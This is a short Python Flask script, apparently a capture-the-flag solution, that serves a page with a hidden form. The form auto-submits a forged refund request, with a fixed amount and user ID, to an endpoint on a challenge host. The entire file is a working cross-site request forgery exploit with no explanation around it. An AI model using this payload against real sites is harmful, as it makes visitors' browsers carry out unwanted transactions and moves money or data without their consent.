from flask import Flask

app = Flask(__name__)

csrf = '''<html>
  <title>ez</title>

  <body>
    <form
      action="http://meme_shop_review.challs.olicyber.it/refund.php"
      method="POST"
      id="csrf">
      <input name="amount" value="4242" />
      <input name="user_id" value="249" />
    </form>

    <script>
      setTimeout(() => {
        document.getElementById("csrf").submit();
      }, 2000);
    </script>
  </body>
</html>'''

@app.route('/')
def home():
    return csrf

if __name__ == '__main__':
    app.run(debug=True)